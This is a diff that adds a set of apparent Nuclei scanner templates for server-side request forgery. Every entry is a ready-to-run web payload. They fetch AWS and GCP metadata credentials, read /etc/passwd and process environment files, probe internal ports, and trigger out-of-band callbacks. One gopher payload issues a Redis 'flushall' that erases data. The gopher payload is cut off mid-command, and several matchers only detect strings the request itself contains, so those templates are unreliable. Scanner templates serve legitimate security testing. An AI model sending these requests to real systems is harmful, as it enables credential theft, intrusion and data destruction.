@@ -1,0 +1,176 @@
+id: basic-ssrf
+info:
+  name: Server-Side Request Forgery
+  author: AniipID
+  severity: high
+  description: Detects SSRF via internal IP access
+  tags: ssrf,internal
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://127.0.0.1:80"
+      - "{{BaseURL}}?url=http://127.0.0.1:8080"
+      - "{{BaseURL}}?url=http://localhost"
+      - "{{BaseURL}}?url=http://169.254.169.254/latest/meta-data/"
+    matchers:
+      - type: regex
+        regex:
+          - "127\\.0\\.0\\.1"
+          - "localhost"
+          - "169\\.254\\.169\\.254"
+        condition: or
+        name: "ssrf-internal-access"
+---
+id: ssrf-cloud-metadata
+info:
+  name: SSRF Cloud Metadata Access
+  author: AniipID
+  severity: critical
+  description: Detects SSRF accessing cloud provider metadata endpoints
+  tags: ssrf,cloud,aws,gcp,azure
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}?url=http://169.254.169.254/latest/user-data/"
+      - "{{BaseURL}}?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
+      - "{{BaseURL}}?url=http://metadata.google.internal/computeMetadata/v1/"
+    headers:
+      Metadata-Flavor: "Google"
+    matchers:
+      - type: regex
+        regex:
+          - "ami-id"
+          - "security-credentials"
+          - "instance-id"
+          - "public-keys"
+          - "service-accounts"
+          - "AccessKeyId"
+          - "SecretAccessKey"
+        condition: or
+        name: "cloud-metadata-leaked"
+---
+id: ssrf-port-scan
+info:
+  name: SSRF Internal Port Scan
+  author: AniipID
+  severity: high
+  description: Detects SSRF capable of internal network port scanning
+  tags: ssrf,port-scan,internal
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://127.0.0.1:22"
+      - "{{BaseURL}}?url=http://127.0.0.1:3306"
+      - "{{BaseURL}}?url=http://127.0.0.1:6379"
+      - "{{BaseURL}}?url=http://127.0.0.1:27017"
+      - "{{BaseURL}}?url=http://127.0.0.1:9200"
+    matchers:
+      - type: word
+        words:
+          - "OpenSSH"
+          - "MySQL"
+          - "redis"
+          - "MongoDB"
+          - "Elasticsearch"
+        condition: or
+        name: "internal-service-detected"
+---
+id: ssrf-blind-oob
+info:
+  name: Blind SSRF via OOB
+  author: AniipID
+  severity: high
+  description: Detects blind SSRF via out-of-band callback
+  tags: ssrf,blind,oob
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://oastify.com/ssrf-test"
+      - "{{BaseURL}}?url=http://burpcollaborator.net/ssrf"
+    matchers:
+      - type: word
+        words:
+          - "oastify"
+          - "burpcollaborator"
+        condition: or
+        name: "ssrf-oob-callback"
+---
+id: ssrf-s3-bucket
+info:
+  name: SSRF Internal S3 Bucket Access
+  author: AniipID
+  severity: high
+  description: Detects SSRF accessing internal S3 buckets
+  tags: ssrf,aws,s3
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}?url=http://s3.amazonaws.com"
+      - "{{BaseURL}}?url=http://bucket.s3.amazonaws.com"
+    matchers:
+      - type: regex
+        regex:
+          - "<Name>"
+          - "s3.amazonaws"
+          - "SecurityCredentials"
+        condition: or
+        name: "s3-bucket-access"
+---
+id: ssrf-file-protocol
+info:
+  name: SSRF via file:// Protocol
+  author: AniipID
+  severity: high
+  description: Detects SSRF using file protocol read
+  tags: ssrf,file-read
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=file:///etc/passwd"
+      - "{{BaseURL}}?url=file:///c:/windows/win.ini"
+      - "{{BaseURL}}?url=file:///proc/self/environ"
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "for 16-bit app"
+        condition: or
+        name: "ssrf-file-read"
+---
+id: ssrf-gopher
+info:
+  name: SSRF via Gopher Protocol
+  author: AniipID
+  severity: critical
+  description: Detects SSRF using gopher protocol for SSRF to RCE
+  tags: ssrf,gopher,rce
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0aa%0d%0a$"
+      - "{{BaseURL}}?url=gopher://127.0.0.1:3306/_"
+    matchers:
+      - type: word
+        words:
+          - "gopher://"
+        name: "gopher-ssrf"
+---
+id: ssrf-dict-protocol
+info:
+  name: SSRF via dict:// Protocol
+  author: AniipID
+  severity: high
+  description: Detects SSRF using dict protocol for internal service probing
+  tags: ssrf,dict,internal
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=dict://127.0.0.1:6379/info"
+      - "{{BaseURL}}?url=dict://127.0.0.1:3306/status"
+    matchers:
+      - type: word
+        words:
+          - "dict://"
+        name: "dict-protocol-ssrf"
